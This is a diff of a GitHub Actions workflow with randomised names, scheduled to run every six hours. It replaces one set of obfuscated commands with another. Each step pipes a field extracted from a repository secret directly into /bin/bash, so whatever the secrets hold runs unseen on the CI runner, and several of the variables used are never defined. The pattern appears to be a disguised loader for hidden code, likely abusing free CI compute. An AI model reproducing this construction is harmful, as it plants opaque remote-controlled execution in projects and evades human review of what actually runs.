@@ -3,27 +3,22 @@ name: leebangxxk
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 0/6 * * *'
+    - cron: '54 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: leebangxxk
         env:
-          upgho5: ${{ secrets.upgho5 }}
+          szk6982: ${{ secrets.szk6982 }}
         run: |
-          echo $upgho5 | jq -r .pqjur6 | /bin/bash
-          echo $sfo531 | jq -r .k71099 | /bin/bash
-          echo $lp539 | jq -r .ii9581 | /bin/bash
-          echo $fm4 | jq -r .xgpqm7171 | /bin/bash
-          echo $gp3110 | jq -r .jiun7281 | /bin/bash
-          echo $vqdcq6930 | jq -r .nofeq69190 | /bin/bash
-          echo $hcet6 | jq -r .jgg630 | /bin/bash
-          echo $jijvc27 | jq -r .horpq2 | /bin/bash
-          echo $vgeuc7 | jq -r .whg9 | /bin/bash
-          echo $tol93401 | jq -r .gvd21 | /bin/bash
-          echo $xld403 | jq -r .ossu71 | /bin/bash
-          echo $xkcy010 | jq -r .ipzui409 | /bin/bash
+          echo $szk6982 | jq -r .v8850 | /bin/bash
+          echo $ffj69318 | jq -r .add05 | /bin/bash
+          echo $ofdu26968 | jq -r .p06 | /bin/bash
+          echo $j8085 | jq -r .v2 | /bin/bash
+          echo $dyz13 | jq -r .mtak633 | /bin/bash
+          echo $fko69367 | jq -r .my4475 | /bin/bash
+          echo $bea0652 | jq -r .q3590 | /bin/bash
 
